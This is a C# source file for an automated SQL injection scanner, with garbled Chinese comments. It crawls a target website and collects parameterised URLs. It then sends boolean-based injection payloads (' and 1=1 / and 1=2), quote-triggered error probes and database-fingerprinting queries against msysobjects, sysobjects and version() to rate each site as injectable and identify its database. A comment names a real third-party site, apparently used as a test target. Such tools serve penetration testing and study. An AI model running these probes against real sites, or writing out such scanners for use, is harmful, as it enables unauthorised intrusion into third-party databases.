using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.RegularExpressions; 
using System.Net; 
using System.IO;
using mshtml;
using System.Threading;

namespace Php
{
    class Http
    {
        //---------����صı���-------------------------------------------------
        public String RootUrl;//Ҫ����ɨ�����վ����ҳurl
        public IPAddress[] ipList;
        public String HtmlCode;//��ҳ���ص�htmlcode
        public Boolean IsInjectable = false;//����վ�Ƿ����sqlע��©��
        public Boolean IsSensitive = false;//����վ�Ƿ�й©������Ϣ
        public String WebLanguage;//����վ�Ŀ������� asp php aspx jsp
        public String DBType="";//���ݿ����� Access��SQLserver��MySQL
        public String Info="";//վ��˵��
        public int SecurityLevel = -1;//վ��İ�ȫ�ȼ�
        /*
            0������ҳ�޷��򿪣����ӳ���
            1����û�з����κΰ�ȫ��©��������վΪ��߰�ȫ����
            2����ע�����ʧ�ܣ�������վû�н����ݴ����ڴ��󱨸��д���й©������Ϣ�İ�ȫ����
            3��������ע��©����������վ���ݴ�������й©������Ϣ
            4��������ע��©�����Ҵ���������Ϣй©�������⣬��վ����û�п��ǹ��κΰ�ȫ���⣬�ǳ����ױ���͸����
        */
        //public String DBVersion;//���ݿ�汾
        public int N_Pages = 0;//ɨ���ҳ������
        public int N_Pages_secure = 0;//��ȫҳ����
        public int N_Pages_sensitive = 0;//й©������Ϣ��ҳ����
        public int N_Pages_injectable = 0;//����ע���ҳ����
        public ArrayList alPossibleInjectionPoints=new ArrayList();//���ܵ�ע���
        public ArrayList alSensitivePoints = new ArrayList();//й©������Ϣ��ע���
        public ArrayList alInjectionPoints = new ArrayList();//ȷʵ����ע���ע���
        public String FirstInjectionPoint="";
        //---------�߳�ͨ����صı���-------------------------------------------------
        public String url;//Ҫɨ���url,���߳������̵߳Ĵ��ݲ���
        public ArrayList altmpIPs = new ArrayList();//װ��ʱ�Ŀ��ܵ�ע���
        public Boolean locked_alPIP = false;
        //public int num = 0;//ĳһ�����̹߳�ɨ����Ŀ���ע�����ܸ���
        //---------�߳���صı���-------------------------------------------------
        public static int t_num = 100;
        public Thread[] t = new Thread[t_num];
        public int n = 0;//��ʾ��ǰ�ڲ��̸߳���        
        //---------������صı���-------------------------------------------------
        public int[] floor_threads_num = new int[128];
        public int floor = 0;

        public float FError = new float();

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Http��Ĺ��캯��
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Http(String rooturl)
        {
            this.RootUrl = rooturl;
        }
        public Http(String rooturl,String info)
        {
            this.RootUrl = rooturl;
            this.Info = info;
        }
        public Http()
        { 
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //��һ����վ����ɨ��,���س���
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void Scan()
        {
            try
            {
                this.ipList = System.Net.Dns.GetHostEntry(new Uri(this.RootUrl).Host).AddressList;
            }
            catch (Exception e)
            {
                e.GetType();
                this.SecurityLevel = 0;
                return;
            }
            //����ҳ����http����
            this.HtmlCode = GetResponseHtmlCode(RootUrl, "GET");
            if (this.HtmlCode.Contains("�޷�������Զ������"))
            {
                this.SecurityLevel = 0;
                return;
            }
            //��������վ�Ŀ������� asp php aspx jsp
            string strASP = @"\.asp\?";
            string strASPX = @"\.aspx\?";
            string strJSP = @"\.jsp\?";
            string strPHP = @"\.php\?";
            this.WebLanguage = "asp";
            Regex rASP = new Regex(strASP, RegexOptions.IgnoreCase);
            Regex rASPX = new Regex(strASPX, RegexOptions.IgnoreCase);
            Regex rJSP = new Regex(strJSP, RegexOptions.IgnoreCase);
            Regex rPHP = new Regex(strPHP, RegexOptions.IgnoreCase);
            MatchCollection mASP = rASP.Matches(HtmlCode);
            MatchCollection mASPX = rASPX.Matches(HtmlCode);
            MatchCollection mJSP = rJSP.Matches(HtmlCode);
            MatchCollection mPHP = rPHP.Matches(HtmlCode);
            int max = mASP.Count;
            if (mASPX.Count >= max)
            {
                this.WebLanguage = "aspx";
                max = mASPX.Count;
            }
            if (mJSP.Count > max)
            {
                this.WebLanguage = "jsp";
                max = mJSP.Count;
            }
            if (mPHP.Count > max)
            {
                this.WebLanguage = "php";
                max = mPHP.Count;
            }
            InjectionPoint IPnew = new InjectionPoint(RootUrl, false, false, false);
            alPossibleInjectionPoints.Add(IPnew); 
            //����ҳ��Ѱ�ҿ��ܵ�SQLע���,������alPossibleInjectionPoints��
            FindPossibleInjectionPoints(HtmlCode, new Uri(RootUrl), alPossibleInjectionPoints);
            if (alPossibleInjectionPoints.Count == 0)
            {
                floor_threads_num[floor] = -1;//ɨ����ֹ��־
                return;
            }
            else
            {
                floor_threads_num[floor++] = alPossibleInjectionPoints.Count;//��һ����Ҫɨ��ҳ�����
                floor_threads_num[floor] = 0;
                SubScan();
            }
        }
        //�ݹ���ã�ÿ�ε��ñ�ʾһ��ɨ�裨�������ɨ�裩
        public void SubScan()
        { 
            altmpIPs.Clear();
            lock (alPossibleInjectionPoints.SyncRoot)
            {
                foreach (InjectionPoint IP in alPossibleInjectionPoints)
                {
                    //������ע����Ѿ���ɨ����� ��ôbye bye��
                    if (IP.Isdealed)
                        continue;
                    IP.Isdealed = true;
                    //���ɷ�ע��
                    if (CanInject(IP.Url))
                    {
                        //������ܵ�ע������ע��
                        IP.CanInject = true;
                        this.N_Pages_injectable++;
                        this.IsInjectable = true;
                    }
                    //���ɷ��ȡ������Ϣ
                    if (CanGetSensitiveInfo(IP.Url))
                    {
                        IP.IsSensitive = true;
                        this.IsSensitive = true;
                        this.N_Pages_sensitive++;
                    }
                    //���ڿ���ע�룬���ڿ�ʼ������վ�����ݿ�����
                    //��һ�η���ע����ʱ��ʼ��⣬ֻ�����һ�Σ�  
                    if (this.FirstInjectionPoint == "" && IP.Url.IndexOf('%') == -1 && IP.IsSensitive == true)
                    {
                        this.FirstInjectionPoint = IP.Url;
                        this.DBType = this.GetDBType(this.FirstInjectionPoint);
                    }
                    if (this.DBType == "" && IP.Url.IndexOf('%') == -1 && IP.CanInject == true)
                    {
                        this.FirstInjectionPoint = IP.Url;
                        this.DBType = this.GetDBType(this.FirstInjectionPoint);
                    }
                    if (IP.IsSensitive | IP.CanInject)
                        this.N_Pages_secure++;
                    //�������̣߳�������һ��ɨ��
                    this.url = IP.Url;
                    t[n % t_num] = new Thread(new ThreadStart(ThreadProc));
                    t[n % t_num].Start();
                    Thread.Sleep(300);//�ȴ��´������̰߳�n����ȥ��Ȼ�����߳�n�ټ�1
                    n++;
                }

                //�ȴ�������(n > 100) ? 100 : n���߳��Ƿ񷵻� 
                for (int i = 0; i < ((n > t_num) ? t_num : n); i++)
                {
                    if (t[i] != null)
                        t[i].Join();
                }
                //������µ�ҳ���л��п��ܵ�ע���
                if (altmpIPs.Count > 0)
                {
                    //������ҳ��Ŀ��ܵ�ע���ʱ������ǰ�Ŀ���ע��㼯���е�ĳ����ͬ
                    foreach (InjectionPoint IPnew in altmpIPs)
                    {
                        bool rep = false;
                        foreach (InjectionPoint IP in alPossibleInjectionPoints)
                        {
                            int end1 = 0, end2 = 0;
                            if (IPnew.Url.IndexOf('?') == -1)
                                end1 = IPnew.Url.Length;
                            else
                                end1 = IPnew.Url.IndexOf('?');
                            if (IP.Url.IndexOf('?') == -1)
                                end2 = IP.Url.Length;
                            else
                                end2 = IP.Url.IndexOf('?');
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && IPnew.Url.IndexOf('?') != -1))
                            {
                                //xxx.asp
                                //xxx.asp?id=123
                                //��
                                rep = false;
                            }
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') != -1))
                            {
                                //xxx.asp?id=123
                                //xxx.asp �� xxx.asp?id=456
                                //����
                                rep = true;
                                break;
                            }
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && IPnew.Url.IndexOf('?') == -1))
                            {
                                //xxx.asp
                                //xxx.asp
                                //����
                                rep = true;
                                break;
                            }
                        }
                        if (!rep)
                        {
                            if (IPnew.Url.StartsWith(RootUrl))
                            {
                                //������µ�url���뵽alPossibleInjectionPoints��,�����Ϊ"��δ����"��"δ֪�Ƿ��ע��" 
                                while (locked_alPIP) ;
                                if (!locked_alPIP)
                                {
                                    locked_alPIP = true;
                                    alPossibleInjectionPoints.Add(IPnew);
                                    locked_alPIP = false;
                                    floor_threads_num[floor] += 1;
                                    break;
                                }
                            }
                            else
                            {
                                foreach (IPAddress ip in ipList)
                                {
                                    if (IPnew.Url.StartsWith("http://" + ip.ToString()))
                                    {
                                        while (locked_alPIP) ;
                                        if (!locked_alPIP)
                                        {
                                            locked_alPIP = true;
                                            alPossibleInjectionPoints.Add(IPnew);
                                            locked_alPIP = false;
                                            floor_threads_num[floor] += 1;
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    altmpIPs.Clear();
                    if (floor_threads_num[floor] > 0)
                    {
                        floor_threads_num[++floor] = 0;
                        for (int i = 0; i < ((n > t_num) ? t_num : n); i++)
                        {
                            if (t[i] != null)
                                t[i].Abort();
                        }
                        n = 0;
                        SubScan();
                    }
                }
                else
                {
                    //��ʶɨ�����
                    floor_threads_num[floor] = -1;
                }
            }
        }
        //���߳�ִ�еĺ���
        public void ThreadProc()
        {
            //int num_t = this.num;
            String url_t = this.url;
            //ArrayList altmpIPs_t = altmpIPs;

            FindPossibleInjectionPoints(GetResponseHtmlCode(url_t, "POST"), new Uri(url_t), altmpIPs);
            //FindPossibleInjectionPoints(GetResponseHtmlCode(url_t, "POST"), new Uri(url_t), altmpIPs_t);
            
            //this.num+=num_t;
            //this.altmpIPs = altmpIPs_t;            
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //�������url����http����,���ܷ��ص�html
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string GetResponseHtmlCode(string url,string method)
        {


            string re = "";
            try
            {
                //����һ��http����
                WebRequest wr = WebRequest.Create(url);
                wr.Method = method;
                wr.ContentType = "application/x-www-form-urlencoded";
                wr.ContentLength = 0;

                WebResponse result = wr.GetResponse();
                Stream ReceiveStream = result.GetResponseStream();

                Byte[] read = new Byte[512];
                int bytes = ReceiveStream.Read(read, 0, 512);

                re = "";
                while (bytes > 0)
                {

                    // ע�⣺
                    // ����ٶ���Ӧʹ�� UTF-8 ��Ϊ���뷽ʽ��
                    // ��������� ANSI ����ҳ��ʽ�����磬932�����ͣ���ʹ�������������䣺
                    //  Encoding encode = System.Text.Encoding.GetEncoding("shift-jis");
                    Encoding encode = System.Text.Encoding.GetEncoding("gb2312");
                    re += encode.GetString(read, 0, bytes);
                    bytes = ReceiveStream.Read(read, 0, 512);
                }
            }
            catch (Exception e)
            {
                re = e.Message;
            }
            return re;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //���ݷ��ص�htmlcodeѰ�ҿ��ܵ�ע���,������Щ���ܵ�ע�����뵽alPossibleInjectionPoints��
        //��ȡhtmlcode�е�����(����·��)
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void FindPossibleInjectionPoints(string htmlCode, Uri relativeLocation,ArrayList aldestIPs)
        { 
            //www.abc.com/ def/ghi/ jkl.asp?id=23  
            //www.abc.com/ def/ghi/ jkl?id=23 
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+\.((asp)|(php)|(jsp)|(aspx))(\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)))";
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+\.((asp)|(php)|(jsp)|(aspx))(\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)(&)?)*)";
            //string strRegex = @"(http://([A-Za-z0-9_.:]+/))?(/)?([(\w*/)|(\./)|(\.\./)])*(\w+(\.((aspx)|(php)|(jsp)|(asp)))?(\?(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)(&)?)+)?)";
            //string strRegex = @"(http://([A-Za-z0-9_.:]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+((\.aspx)|(\.php)|(\.jsp)|(\.asp)|(\?(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))))((\?)(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)?)";
            string strRegex = @"(http://([A-Za-z0-9_.:]+/))?([(\w*/)|(\./)|(\.\./)])*((\w+((\.aspx)|(\.php)|(\.jsp)|(\.asp))((\?)(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)?)|(\w+\?((\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)))";

            Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(htmlCode);
            
            for (int i = 0; i <= m.Count - 1; i++)
            {
                bool rep = false;
                string strNew = m[i].ToString();
                //�ľ���·����ʽ��url
                Uri urlNew = new Uri(relativeLocation, strNew);
                strNew = urlNew.AbsoluteUri.ToString();

                // �����ظ���URL,���Ҳ��ܳ�վ(2������) 
                //ArrayList al = new ArrayList();
                //al = aldestIPs; 
                lock (aldestIPs.SyncRoot)
                {
                    foreach (InjectionPoint IP in aldestIPs)
                    {
                        int end1 = 0, end2 = 0;
                        if (strNew.IndexOf('?') == -1)
                            end1 = strNew.Length;
                        else
                            end1 = strNew.IndexOf('?');
                        if (IP.Url.IndexOf('?') == -1)
                            end2 = IP.Url.Length;
                        else
                            end2 = IP.Url.IndexOf('?');
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && strNew.IndexOf('?') != -1))
                        {
                            //xxx.asp
                            //xxx.asp?id=123
                            //��
                            rep = false;
                        }
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') != -1))
                        {
                            //xxx.asp?id=123
                            //xxx.asp �� xxx.asp?id=456
                            //����
                            rep = true;
                            break;
                        }
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && strNew.IndexOf('?') == -1))
                        {
                            //xxx.asp
                            //xxx.asp
                            //����
                            rep = true;
                            break;
                        }
                    }
                    if (!rep)
                    {
                        //������µ�url���뵽alPossibleInjectionPoints��,�����Ϊ"��δ����"��"δ֪�Ƿ��ע��"
                        if (strNew.StartsWith(RootUrl))
                        {
                            InjectionPoint IPnew = new InjectionPoint(strNew, false, false, false);
                            while (locked_alPIP) ;
                            if (!locked_alPIP)
                            {
                                locked_alPIP = true;
                                aldestIPs.Add(IPnew);
                                locked_alPIP = false;
                            }
                        }
                        else
                        {
                            foreach (IPAddress ip in ipList)
                            {
                                if (strNew.StartsWith("http://" + ip.ToString()))
                                {
                                    InjectionPoint IPnew = new InjectionPoint(strNew, false, false, false);
                                    while (locked_alPIP) ;
                                    if (!locked_alPIP)
                                    {
                                        locked_alPIP = true;
                                        aldestIPs.Add(IPnew);
                                        locked_alPIP = false;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            } 
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //���ĳ�����ܵ�ע���InjectionPoint�Ƿ����ע��
        //����url'        ���ش�����Ϣ
        //����url and 1=1 ��������������url�ķ���һ��
        //����url and 1=2 ����û�н��
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean CanInject(String url)
        {
            FError = 0.0008F;
            Boolean canInject = false;
            if (url.IndexOf('?') != -1)
            {
                String HtmlCode_url = GetResponseHtmlCode(url, "POST");
                //------------------------------������------------------------------------------------
                String HtmlCode_url_with_11 = GetResponseHtmlCode(url + " and 1=1", "POST");
                String HtmlCode_url_with_12 = GetResponseHtmlCode(url + " and 1=2", "POST");
                //------------------------------�ַ���------------------------------------------------
                String HtmlCode_url_with_comma_11 = GetResponseHtmlCode(url + "' and '1'='1", "POST");
                String HtmlCode_url_with_comma_12 = GetResponseHtmlCode(url + "' and '1'='2", "POST");

                if (
                    IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 ��������
                    && (
                        (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 �޷���
                        || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                        )
                    )
                    return true;
                if (
                    IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_comma_11, FError)//and 1=1 ��������
                    && (
                        (HtmlCode_url_with_comma_12 == null || HtmlCode_url_with_comma_12.Trim() == "") //and 1=2 �޷���
                        || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_comma_12, FError)
                        )
                    )
                    return true;
            
                //--------------http://donate.xjtu.edu.cn/xqb/show.php?dbfile=text_file&id=38-------------------
                //--------------����������������--------------------------------------------------------------------
                //Uri Uri_test = new Uri(url);
                //String query=Uri_test.Query;
                int p_and=0; 
                int p_and1 = url.IndexOf('&', p_and);
                while (url.IndexOf('&', p_and) != -1)
                {
                    //------------------------------������------------------------------------------------
                    HtmlCode_url_with_11 = GetResponseHtmlCode(url.Substring(0,p_and1) + " and 1=1"+url.Substring(p_and1), "POST");
                    HtmlCode_url_with_12 = GetResponseHtmlCode(url.Substring(0,p_and1) + " and 1=2"+url.Substring(p_and1), "POST");
                    if (
                        IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 ��������
                        && (
                            (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 �޷���
                            || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                            )
                        )
                        return true;
                    //------------------------------�ַ���------------------------------------------------
                    HtmlCode_url_with_11 = GetResponseHtmlCode(url.Substring(0,p_and1) + "' and '1'='1"+url.Substring(p_and1), "POST");
                    HtmlCode_url_with_12 = GetResponseHtmlCode(url.Substring(0,p_and1) + "' and '1'='2"+url.Substring(p_and1), "POST");
                    if (
                        IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 ��������
                        && (
                            (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 �޷���
                            || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                            )
                        )
                        return true;
                    p_and = p_and1+1;
                }
            }

            return canInject;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //���ĳ�����ܵ�ע���InjectionPoint�Ƿ�й©������Ϣ 
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean CanGetSensitiveInfo(String urlstr)
        {
            Boolean CanGetSensitive = false;
            String HtmlCode_url_with_comma = GetResponseHtmlCode(urlstr + "'", "POST");
            string strSensitiveCheck = @"(Database error)|(MySQL Error)|(Microsoft JET Database Engine)|(Microsoft JET)|(Microsoft OLE DB Provider for SQL Server)|(error in your SQL syntax)|(Apache Tomcat)|(SQLException)|(�ڲ�����������)|(Warning)|(Source Error)|(Exception)";
            Regex r = new Regex(strSensitiveCheck, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(HtmlCode_url_with_comma); 
            if (m.Count > 0)
                CanGetSensitive = true;
            return CanGetSensitive;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //��ȡ����վ�����ݿ����� MySQL Acces SQLserver δ֪
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public String GetDBType(String url)
        {
            float Ferr = new float();
            Ferr = 0.1F;
            String Type = "";
            string strDBCheck = "";
            Regex r = null;
            MatchCollection m = null; 
            String HtmlCode_url = GetResponseHtmlCode(url, "POST");
            String HtmlCode_url_with_comma = GetResponseHtmlCode(url + "'", "POST");
            String HtmlCode_url_with_msysobjects = GetResponseHtmlCode(url + " and (select count(*) from msysobjects)>0", "POST");
            ////////////////////////////
            strDBCheck = @"(Database error)|(MySQL Error)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "MySQL";
                return Type;
            }
            strDBCheck = @"(Microsoft JET Database Engine)|(Microsoft JET)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "Access";
                return Type;
            }
            strDBCheck = @"(Microsoft OLE DB Provider for SQL Server)|(�﷨����)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "SQLserver";
                return Type;
            }
            //////////////////////////////
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_msysobjects, Ferr))
            {
                Type = "Access";
                return Type;
            }
            String HtmlCode_url_with_sysobjects = GetResponseHtmlCode(url + " and (select count(*) from sysobjects)>0", "POST");
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_sysobjects, Ferr))
            {
                Type = "SQLserver";
                return Type;
            }
            String HtmlCode_url_with_ascii_version = GetResponseHtmlCode(url + " and ascii(version())>0", "POST");
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_ascii_version, Ferr))
            {
                Type = "MySQL";
                return Type;
            }

            Type = "δ֪"; 
            return Type;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //���η��ص�htmlcode��ģ��ƥ��
        //Ŀǰ�ķ����ǣ��ж�����htmlcode�Ĵ�С�Ƿ�ӽ�
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean IsHtmlCodeSimilar(String HtmlCode1,String HtmlCode2,float err)
        {
            Boolean IsSimilar = false;
            if (Math.Abs(((float)HtmlCode1.Length * 2 / (HtmlCode1.Length + HtmlCode2.Length)) - 1) < err)
                IsSimilar = true;
            return IsSimilar;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //���η��ص�htmlcode��ģ��ƥ��
        //Ŀǰ�ķ����ǣ��ж�����htmlcode�Ĵ�С�Ƿ�ӽ�
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean IsContentSimilar(String HtmlCode1, String HtmlCode2, float err)
        {
            HtmlCode1 = HtmlCode1.Trim();
            HtmlCode2 = HtmlCode2.Trim();
            Boolean IsSimilar = false;
            Boolean stop = false;
            int n_similar=0;
            while (!stop && n_similar < HtmlCode1.Length && n_similar < HtmlCode2.Length)
            {
                if (HtmlCode1.Substring(n_similar, 1) == HtmlCode2.Substring(n_similar, 1))
                    n_similar++;
                else
                    stop = true;
            }
            if (((float)n_similar * 2) / (HtmlCode1.Length + HtmlCode2.Length) > err)
                return true;
            return IsSimilar;
        }
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //δ��  ��ȡhtmlcode�е�����
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public ArrayList GetHyperLinks1(string htmlCode)
        {
            ArrayList al = new ArrayList();
            //www.abc.com/ def/ghi/ jkl.asp?id=23 
            //string strRegex = @"\w+\.asp\?\w+=\w+";
            //string strRegex = @"\<a.*href\s*=\s*(?:""(?<url>[^""]*)""|'(?<url>[^']*)'|(?<url>[^\>^\s]+)).*\>(?<title>[^\<^\>]*)\<[^\</a\>]*/a\>"; 
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w+/)*|(\./)?|(\.\./)*])?(\w+\.((asp)|(php)|(jsp))\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))";
            string strRegex = @"http://([A-Za-z0-9_.]+/)(\w+/)*(\w+\.((asp)|(php)|(jsp))\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))";

            Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(htmlCode);

            for (int i = 0; i <= m.Count - 1; i++)
            {
                bool rep = false;
                string strNew = m[i].ToString();
                //Uri urlNew = new Uri(strNew);

                // �����ظ���URL 
                foreach (string str in al)
                {
                    //Uri url = new url(str);
                    if (strNew == str || strNew.Substring(0, strNew.IndexOf('?')) == str.Substring(0, str.IndexOf('?')))
                    {
                        rep = true;
                        break;
                    }
                }
                if (!rep) al.Add(strNew);
            }
            al.Sort();
            return al;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //δ��  �����·�����ӷ�ʽ��htmlcodeת��Ϊ����·����htmlcode
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string ConvertToAbsoluteUrls(string html, Uri relativeLocation)
        {
            IHTMLDocument2 doc = new HTMLDocumentClass();
            doc.write(new object[] { html });
            doc.close();
 
            foreach (IHTMLAnchorElement anchor in doc.links)
            {
                IHTMLElement element = (IHTMLElement)anchor;
                string href = (string)element.getAttribute("href", 2);
                if (href != null)
                {
                    Uri addr = new Uri(relativeLocation, href);
                    anchor.href = addr.AbsoluteUri;
                }
            }

            foreach (IHTMLImgElement image in doc.images)
            {
                IHTMLElement element = (IHTMLElement)image;
                string src = (string)element.getAttribute("src", 2);
                if (src != null)
                {
                    Uri addr = new Uri(relativeLocation, src);
                    image.src = addr.AbsoluteUri;
                }
            }

            string ret = doc.body.innerHTML;

            return ret;
        }

    }
} 